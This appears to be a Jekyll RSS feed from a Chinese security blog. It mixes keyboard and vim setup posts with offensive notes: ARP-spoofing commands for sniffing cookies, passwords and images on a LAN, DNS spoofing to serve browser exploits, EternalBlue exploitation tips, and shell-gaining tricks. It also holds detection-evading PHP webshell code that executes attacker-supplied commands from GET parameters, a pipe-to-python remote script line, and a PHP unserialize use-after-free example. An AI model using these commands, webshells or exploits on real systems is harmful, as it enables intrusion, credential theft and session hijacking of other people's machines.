<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Sat, 20 May 2017 16:45:10 +0800</pubDate>
    <lastBuildDate>Sat, 20 May 2017 16:45:10 +0800</lastBuildDate>
    <generator>Jekyll v3.4.2</generator>
    
      <item>
        <title>HHKB BT键盘设置</title>
        <description>&lt;h3 id=&quot;0x00-购买&quot;&gt;0x00 购买&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.购买hhkb bt最终采用办法为萌购代购(没有信用卡无法自己在日亚上海淘,如果用别人的信用卡购买会被日亚认为是存在安全
风险,需要发传真验证账户安全性,这是大坑)
2.最终购买HHKB BT+几个键帽与拨键帽器一共花费2105rmb
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-设置&quot;&gt;0x01 设置&lt;/h3&gt;

&lt;h4 id=&quot;0xa-测试环境&quot;&gt;0xa 测试环境&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;系统:macOS sierra
pc:imac
keyboard:HHKB BT(无刻版)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;0xb-detail&quot;&gt;0xb Detail&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.背面的6个开关设置2,3为打开,其余全部关闭

2.HHKB BT此处不用安装键盘驱动,官网如下说法:
    &quot;HHKB Mac-only driver installation on the Professional BT does not need.&quot;

3.设置control键按下为control键,只按下一次为esc键(利于vim),原来的修饰键不变,在keyboard maestro中设置如下图即可(
与imac自带的键盘的设置有一点不同,imac自带键盘的设置还需将caps设置为ctrl,具体可见
http://3xp10it.cc/linux/2017/03/11/安装macOS-sierra要做的事/)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/hhkb-ctr2esc.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4.快捷键
to be continue…&lt;/p&gt;
</description>
        <pubDate>Sat, 20 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/20/HHKB-BT%E9%94%AE%E7%9B%98%E8%AE%BE%E7%BD%AE/</guid>
        
        <category>HHKB</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>vim中英文输入法自动切换完美方案</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;about:
    解决vim下的中英文输入法切换的问题

测试环境:
    系统:macOS sierra(win和linux没有测试,理论上也支持)
    应用:MacVim(同样适用于vim)
    键盘:HHKB PRO BT(同样适用于普通键盘)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
使用squirrel输入法(笔者使用输入法轨迹:squirrel-&amp;gt;百度五笔-&amp;gt;squirrel)
    在squirrel的配置文件(~/Library/Rime/default.custom.yaml)中设置一个按键绑定为按了esc后使用英文输入:
    {accept: Escape, toggle: ascii_mode, when: always}

tip:例如笔者的~/Library/Rime/default.custom.yaml文件内容如下设置:

    patch:
      schema_list:
        - schema: wubi_pinyin
      ascii_composer:
        good_old_caps_lock: true
        switch_key:
          Shift_L: commit_code
      key_binder:
        bindings:
          - {accept: Escape, toggle: ascii_mode, when: always}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-tips&quot;&gt;0x02 Tips&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---&amp;gt;建议将control键设置为按一下为esc,按住为control&amp;lt;---

hint:这样设置的好处太多,macOS下设置方法为使用keyboard maestro设置,如果不会可参考
http://3xp10it.cc/web/2017/05/20/HHKB-BT键盘设置/

windows及linux下由于没有keyboard maestro软件所以需要找到替代的可以设置按键设置的工具

按照建议设置后效果:
1.在insert模式下按一下control键可直接从insert模式转成normal模式,此外还会自动将输入法转成squirrel
的英文输入模式
2.control的组合键不受影响
3.这里的建议也可不参考,不影响自动切换中英文输入法的效果
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-快速通道&quot;&gt;0x03 快速通道&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.安装squirrel后使用https://github.com/neolee/SCU设置好并重新部署
2.wget https://gist.githubusercontent.com/3xp10it/9f51ba895e47cdd5ed1b04f765298df9/raw/8d25bbcc5483e9f77ba24a3a5e84d28cc937fd9a/default.custom.yaml -O ~/Library/Rime/default.custom.yaml
3.重新部署使生效

或运行(不建议)
wget https://raw.githubusercontent.com/3xp10it/mytools/master/autoSquirrel.py -O /tmp/autoSquirrel.py &amp;amp;&amp;amp; python3 /tmp/autoSquirrel.py

hint:这里原来可以少写一些字符如下的:
wget -O - https://raw.githubusercontent.com/3xp10it/mytools/master/autoSquirrel.py | python3
但是实际发现由于autoSquirrel.py文件中有与用户交互的函数(input),这样运行会报错
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 19 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/vim/2017/05/19/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E5%AE%8C%E7%BE%8E%E6%96%B9%E6%A1%88/</link>
        <guid isPermaLink="true">http://localhost:4000/vim/2017/05/19/vim%E4%B8%AD%E8%8B%B1%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2%E5%AE%8C%E7%BE%8E%E6%96%B9%E6%A1%88/</guid>
        
        <category>vim</category>
        
        <category>输入法自动切换</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>内网中间人玩法备忘录</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录内网中间人的玩法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-欺骗方法&quot;&gt;0x01 欺骗方法&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)ettercap
    ettercap -Tqi eth0 -M arp /ip// /ip//
b)arpspoof
    echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
    arpspoof -i eth0 -t 192.168.1.101 192.168.1.1
        让受害者以为自己是网关
    arpspoof -i eth0 -t 192.168.1.1 192.168.1.101
        让网关以为自己是受害者
c)mitmf
    mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-利用原理&quot;&gt;0x02 利用原理&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用中间人欺骗(ettercap,arpspoof,mitmf)使流量经过本机,然后通过数据分析工具(ferret,wireshark,dsniff,driftnet)提取出重要信息(cookie,passwords,pictures)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x03-不同组合&quot;&gt;0x03 不同组合&lt;/h3&gt;

&lt;h4 id=&quot;0xa-ettercapferrethamster&quot;&gt;0xa ettercap+ferret+hamster&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:监听cookie达到会话劫持的目的

1.ettercap:让数据经过本机网卡
ettercap -Tqi eth0 -M arp /192.168.1.1// ///
    欺骗路由器192.168.1.1和其他机器的通话
    ettercap -Tqi eth0 -M arp /// ///
        欺骗任意两台机器之间的通话
    ettercap -Tqi eth0 -M arp /192.168.1.101// /192.168.1.1//
        欺骗192.168.1.101和路由器192.168.1.101之间的通话

2.ferret:取cookie
ferret -i eth0
    kali(x64)没有ferret,需要如下命令安装:
    dpkg --add-architecture i386 &amp;amp;&amp;amp; apt-get clean &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get upgrade -y &amp;amp;&amp;amp; apt-get dist-upgrade -y &amp;amp;&amp;amp; aptitude install ferret-sidejack:i386

3.hamster:利用cookie
hamster
    需要设置浏览器的代理为127.0.0.1:1234,并在浏览器中访问http://hamster
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xb-cain&quot;&gt;0xb cain&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取密码
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xc-mitmfdsniff&quot;&gt;0xc mitmf+dsniff&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取明文密码

mitmf -i eth0 --spoof --arp --target 192.168.1.101 --gateway 192.168.1.1
dsniff -i eth0
    或dsniff -p file.pcap(这里需要中间人欺骗后wireshark抓包)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xd-ettercapdriftnet&quot;&gt;0xd ettercap+driftnet&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取图片

ettercap -Tqi eth0 -M arp /192.168.1.1// ///
driftnet -i eth0 -a -d /tmp/output/
    或driftnet -f file.pcap -a -d /tmp/output/(这里需要中间人欺骗后wireshark抓包)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0xe-ettercapiefirefoxchromesafari漏洞&quot;&gt;0xe ettercap+ie(firefox,chrome,safari)漏洞&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;作用:获取shell

vim /etc/ettercap/etter.conf
    编辑将euid和egid设置为0,并设置使用iptables或是ipchains,设置完成后再运行下面的命令,或者参考如下
        https://www.youtube.com/watch?v=tW_NMG2IZ5s

vim /etc/ettercap/etter.dns
    添加* A 192.168.1.101在开始设置解析的地方

ettercap -Tqi eth0 -M arp -P dns_spoof /192.168.1.101// ///
    ettercap -P list可查看支持的插件
    这里用的是dns欺骗插件

msf设置利用ie漏洞或其他浏览器的漏洞
    
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Tue, 16 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/16/%E5%86%85%E7%BD%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E7%8E%A9%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/16/%E5%86%85%E7%BD%91%E4%B8%AD%E9%97%B4%E4%BA%BA%E7%8E%A9%E6%B3%95%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>中间人</category>
        
        <category>内网</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>PHP中的内存破坏漏洞利用学习(2nd)</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;学习乌云中的&amp;lt;&amp;lt;PHP中的内存破坏漏洞利用&amp;gt;&amp;gt;
link:http://cb.drops.wiki/drops/tips-4988.html

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 15 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/15/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(2nd)/</guid>
        
        <category>php</category>
        
        <category>内存破坏</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>php对可能是垃圾的zval的回收过程的理解</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;本文记录对php的对可能是垃圾的zval的回收过程的理解
2&amp;gt;必读link:
    http://www.freebuf.com/vuls/122938.html
3&amp;gt;测试环境:php5.4.34(php5.3之后的垃圾回收机制)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;h4 id=&quot;0x01-不同的说法&quot;&gt;0x01 不同的说法&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;认为上面link中的以下说法不对:
------------refer-----------
首先用zval_mark_grey把外部数组标记为灰色.
对外部数组的子节点即ArrayObject对象标记为灰色refcount减一,此时ArrayObject的refcount为0.
对ArrayObject的子节点即内部数组的两个成员分别指向外部数组和内部数组,分别调用zval_mark_grey,实际又会对外部数组和内
部数组进行操作.因为外部数组已经被标记过灰色所以直接返回.而内部数组被标记为灰色.两个数组分别refcount减一此时两个数
组refcount都是1.然后又会对内部数组成员分别指向外部数组和内部数组调用zval_mark_grey.这时会再次把外部数组和内部数组
的refcount减一,此时外部数组和内部数组的refcount都已经是0了.
------------refer-----------
认为上面的:
&quot;首先用zval_mark_grey把外部数组标记为灰色.&quot;是错的,认为没有这个操作.
&quot;因为外部数组已经被标记过灰色所以直接返回.&quot;是错的,因为外部数组不是灰色,认为外部数组不会被处理(认为不会被标记成灰色
也不会将外部数据的refcount减1)

认为下面的refer中的说法是对的:
http://www.cnblogs.com/orlion/p/5350844.html
------------refer-------------
A:为了避免每次变量的refcount减少的时候都调用GC的算法进行垃圾判断,此算法会先把所有前面准则3情况下的zval节点放入
一个节点(root)缓冲区(root buffer),并且将这些zval节点标记成紫色,同时算法必须确保每一个zval节点在缓冲区中之出现一
次.当缓冲区被节点塞满的时候,GC才开始开始对缓冲区中的zval节点进行垃圾判断.

B:当缓冲区满了之后,算法以深度优先对每一个节点所包含的zval进行减1操作,为了确保不会对同一个zval的refcount重复执行
减1操作,一旦zval的refcount减1之后会将zval标记成灰色.需要强调的是,这个步骤中,起初节点zval本身不做减1操作,但是如果
节点zval中包含的zval又指向了节点zval(环形引用),那么这个时候需要对节点zval进行减1操作.

C:算法再次以深度优先判断每一个节点包含的zval的值,如果zval的refcount等于0,那么将其标记成白色(代表垃圾),如果zval的
refcount大于0,那么将对此zval以及其包含的zval进行refcount加1操作,这个是对非垃圾的还原操作,同时将这些zval的颜色变成
黑色(zval的默认颜色属性)

D:遍历zval节点,将C中标记成白色的节点zval释放掉.
------------refer-------------

这里的讲的深度优先的理解如下:
(refer:http://baike.baidu.com/link?url=2hjd4UB9VHErMLvWRQ1aJU6vRajinVYZHDre1kWEPAVxsagDQUgBwcIqVv7NKgJLsPJmUfke74aihNXFjh8JvmJMm9OjwMPKmLXvx7geXkAERoRU_kORCBdiLhpvhwJX1UAwIsIAaWG98zgfbUDwq_)
深度优先搜索是一种在开发爬虫早期使用较多的方法.它的目的是要达到被搜索结构的叶结点(即那些不包含任何超链的HTML文件).
在一个HTML文件中,当一个超链被选择后,被链接的HTML文件将执行深度优先搜索,即在搜索其余的超链结果之前必须先完整地搜索
单独的一条链.深度优先搜索沿着HTML文件上的超链走到不能再深入为止,然后返回到某一个HTML文件,再继续选择该HTML文件中的
其他超链.当不再有其他超链可选择时,说明搜索已经结束.

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;0x02-处理过程&quot;&gt;0x02 处理过程&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;上面link(http://www.freebuf.com/vuls/122938.html)中的代码如下:

&amp;lt;?php
$serialized_string = 'a:1:{i:1;C:11:&quot;ArrayObject&quot;:37:{x:i:0;a:2:{i:1;R:4;i:2;r:1;};m:a:0:{}}}';
$outer_array = unserialize($serialized_string);
gc_collect_cycles();
$filler1 = &quot;aaaa&quot;;
$filler2 = &quot;bbbb&quot;;
var_dump($outer_array);
?&amp;gt;

预期的结果应该是:

array(1) { // outer_array,refcount=2,is_ref=0
  [1]=&amp;gt;
  object(ArrayObject)#1 (1) { // refcount=1,is_ref=0
    [&quot;storage&quot;:&quot;ArrayObject&quot;:private]=&amp;gt;
    array(2) { // inner_array,refcount=2,is_ref=1
      [1]=&amp;gt;
      // Reference to inner_array,refcount=2,is_ref=1
      [2]=&amp;gt;
      // Reference to outer_array,refcount=2,is_ref=0
    }
  }
}

最后的结果是:

string(4) &quot;bbbb&quot;

之所以会产生这样的结果是因为有个处理不当的漏洞,也即对ArrayObject的refcount的减1处理不当(实际对ArrayObject的子
zval也即array(2)[即inner_array]对应的zval的多做了一次对array(2)的子zval(两个reference)的refcount减1的操作)

实际上按照php5.3之后的回收机制应该要做的是这样的流程:

a)由于gc_root_buffer的个数超过了设定的100000,于是进入gc_collect_cycles()函数进行相关处理.

b)首先判断array(1)[也即outer_array]是不是可能是一个垃圾zval,判断依据为:

1:如果一个zval的refcount增加,那么此zval还在使用,不属于垃圾
2:如果一个zval的refcount减少到0, 那么zval可以被释放掉,不属于垃圾
3:如果一个zval的refcount减少之后大于0,那么此zval还不能被释放,此zval可能成为一个垃圾
(refer:http://www.cnblogs.com/orlion/p/5350844.html)
array(1)的refcount为2,满足上面第3点,也即array(1)[也即outer_array]可能是一个垃圾zval,由于gc_collect_cycles()函数只
对可能是垃圾的zval进行处理,同样判断出array(2)[也即inner_array]对应的zval可能是一个垃圾zval,这样的话调用
gc_collect_cycles()函数后会对array(1)和array(2)对应的2个zval进行如下处理过程

c)首先将array(1)[也即outer_array]对应的zval的子zval也即object(ArrayObject)对应的zval的refcount减1,此时相关变化如下:
    object(ArrayObject)#1 (1) { // refcount=0,is_ref=0
然后对object(ArrayObject)对应的zval的子zval也即array(2)[也即inner_array]对应的zval的refcount减1,此时相关变化如下:
    array(2) { // inner_array,refcount=1,is_ref=1
然后对array(2)[也即inner_array]对应的zval的子zval也即array(2)的两个元素[1]和[2]对应的zval的refcount各减1,此时相关
变化如下:
    array(1) { // outer_array,refcount=1,is_ref=0
      [1]=&amp;gt;
      // Reference to inner_array,refcount=1,is_ref=1
      [2]=&amp;gt;
      // Reference to outer_array,refcount=1,is_ref=0

到这里各个zval的refcount结果如下:

    array(1) { // outer_array,refcount=1,is_ref=0
      [1]=&amp;gt;
      object(ArrayObject)#1 (1) { // refcount=0,is_ref=0
        [&quot;storage&quot;:&quot;ArrayObject&quot;:private]=&amp;gt;
        array(2) { // inner_array,refcount=1,is_ref=1
          [1]=&amp;gt;
          // Reference to inner_array,refcount=1,is_ref=1
          [2]=&amp;gt;
          // Reference to outer_array,refcount=1,is_ref=0
        }
      }
    }
现在对array(1)[也即outer_array]对应的zval的&quot;深度优先对包含的子zval的refcount减1操作&quot;完成,发现array(1)对应的zval
的refcount没有变成0,然后判定array(1)对应的zval(这个原来认为可能是垃圾zval的zval)不是垃圾zval,然后将刚才的
refcount减1过的zval的refcount进行+1复原.然后进入判断下一个zval是否是垃圾zval的流程,也即判断
array(2)[也即inner_array]对应的zval是不是一个垃圾zval的流程,易知这个流程结束后会发现它并
不是一个垃圾zval,然后复原相关zval的refcount,到此结束对这2个zval的gc_collect_cycles()的处理

本文讲的主要是gc_collect_cycles()的意图流程,http://www.freebuf.com/vuls/122938.html中的漏洞成因是因为相关php版本的
实际处理细节与这里讲的意图流程不同导致.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 12 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/12/php%E5%AF%B9%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9E%83%E5%9C%BE%E7%9A%84zval%E7%9A%84%E5%9B%9E%E6%94%B6%E8%BF%87%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/12/php%E5%AF%B9%E5%8F%AF%E8%83%BD%E6%98%AF%E5%9E%83%E5%9C%BE%E7%9A%84zval%E7%9A%84%E5%9B%9E%E6%94%B6%E8%BF%87%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/</guid>
        
        <category>php</category>
        
        <category>垃圾回收</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>ms17-010备忘录</title>
        <description>&lt;h3 id=&quot;0x00-about&quot;&gt;0x00 About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;检测方法:
1.msf search ms17010
2.https://github.com/RiskSense-Ops/MS17-010

实战溢出getshell方法:
1.https://github.com/fuzzbunch/fuzzbunch
a)命令行模式:python fb.py(先用eternalblue再用double[tab])
b)gui模式:python configure_lp.py

2.msf第三方组合工具
https://www.youtube.com/watch?v=4OHLor9VaRI
    x64kali:
        dpkg --add-architecture i386 &amp;amp;&amp;amp; apt-get update &amp;amp;&amp;amp; apt-get install wine32 
        rm -r ~/.wine 
        wine cmd.exe   
        exit
https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit

3.python版https://www.t00ls.net/thread-39687-1-1.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-attention&quot;&gt;0x01 Attention&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.win7 x86效果不好,不稳定,原因不明,考虑换成fuzzbunch的gui方法
2.目标是win7 x86时用reverse_tcp时必须用lport=4444,本机的端口为4444(test in elevenpaths/eternalblue-doublepulsar-metasploit)
3.目标是win7 x86时用bind_tcp时必须用lport=4444,目标的端口为4444(test in elevenpaths/eternalblue-doublepulsar-metasploit)
2.fuzzbunch的命令行模式默认设置的注入的进程是lsass.exe,x86平台下会导致目标机器重启,换成explorer.exe(或wlms.exe)
3.目标系统为x64位系统最好设置注入进程为lsass.exe
4.有些有公网ip的云主机(vps)就算设置了打开一些端口也会被服务商过滤掉,这种情况要在vps上开不容易被过滤的端口,比如443,53,80等
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x02-special&quot;&gt;0x02 Special&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;特殊利用方式,用这个漏洞来提权,smb叠加利用提权
https://www.t00ls.net/thread-39703-1-1.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 04 May 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/05/04/ms17-010%E5%A4%87%E5%BF%98%E5%BD%95/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/05/04/ms17-010%E5%A4%87%E5%BF%98%E5%BD%95/</guid>
        
        <category>ms17-010</category>
        
        <category>web</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>tricks</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;记录奇技
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.phpinfo页面+lfi漏洞可getshell
2.sqli可load_file时可利用smb重放反弹shell[未验证]
3.php代码审计时全文搜索unserilize函数的调用,分析这个unserilize有没有漏洞
    如果有unserialize客户端输入则危害很大,可远程代码执行(cve-2014-8142,cve-2015-0231等)
4.phpmyadmin的root用户没有写权限时可将general log设置为on,并把日志文件设置为php文件(t00ls)
    https://www.t00ls.net/articles-38892.html
5.smb叠加利用提权(利用ms17-010)
    https://www.t00ls.net/thread-39703-1-1.html
6.获取网站隐藏后台地址
    https://www.t00ls.net/viewthread.php?tid=34239&amp;amp;extra=page=1&amp;amp;amp;filter=type&amp;amp;amp;typeid=39
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Thu, 27 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/27/tricks/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/27/tricks/</guid>
        
        <category>tricks</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>php中&amp;引用免杀webshell</title>
        <description>&lt;h3 id=&quot;0x00-php中的&quot;&gt;0x00 php中的&amp;amp;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.函数的参数引用
&amp;lt;?php
function test(&amp;amp;$a){ 
    $a=$a+100; 
    } 
    $b=1; 
    echo $b;//输出１ 
    test($b);   //这里$b传递给函数的其实是$b的变量内容所处的内存地址,通过在函数里改变$a的值就可以改变$b的值了 
    echo &quot;&amp;lt;br&amp;gt;&quot;; 
    echo $b;//输出101
?&amp;gt;

2.函数的返回引用
&amp;lt;?php
function &amp;amp;test()
{ 
    static $b=0;//申明一个静态变量 
    $b=$b+1; 
    echo $b; 
    return $b; 
}

$a=test();//这条语句会输出$b的值为１ 
$a=5; 
$a=test();//这条语句会输出$b的值为2
$a=&amp;amp;test();//这条语句会输出$b的值为3,这句相当于$a=&amp;amp;$b;
$a=5; 
$a=test();//这条语句会输出$b的值为6
?&amp;gt;

理解参考:
http://www.cnblogs.com/thinksasa/p/3334492.html
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;0x01-detail&quot;&gt;0x01 Detail&lt;/h3&gt;

&lt;h4 id=&quot;a利用函数的参数引用免杀&quot;&gt;a)利用函数的参数引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($_GET[cmd]);
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;b利用函数的返回引用免杀&quot;&gt;b)利用函数的返回引用免杀&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
class talker{
    public $data = 'Hi';
    public function &amp;amp; get(){
        return $this-&amp;gt;data;
    }
}

$aa = new talker();
$d = &amp;amp;$aa-&amp;gt;get();
$d = $_GET[cmd];

function foo(&amp;amp;$var)
{
    $var=$var.'t';
}
$a=&quot;asser&quot;;
foo($a);
$a($aa-&amp;gt;data);

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;本文代码下载&lt;br /&gt;
&lt;a href=&quot;https://github.com/3xp10it/xwebshell/tree/master/php/%26&quot;&gt;download&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 25 Apr 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/04/25/php%E4%B8%AD&%E5%BC%95%E7%94%A8%E5%85%8D%E6%9D%80/</guid>
        
        <category>php</category>
        
        <category>引用</category>
        
        <category>免杀</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>c++中的&amp;的用法</title>
        <description>&lt;h3 id=&quot;0x00-link&quot;&gt;0x00 Link&lt;/h3&gt;

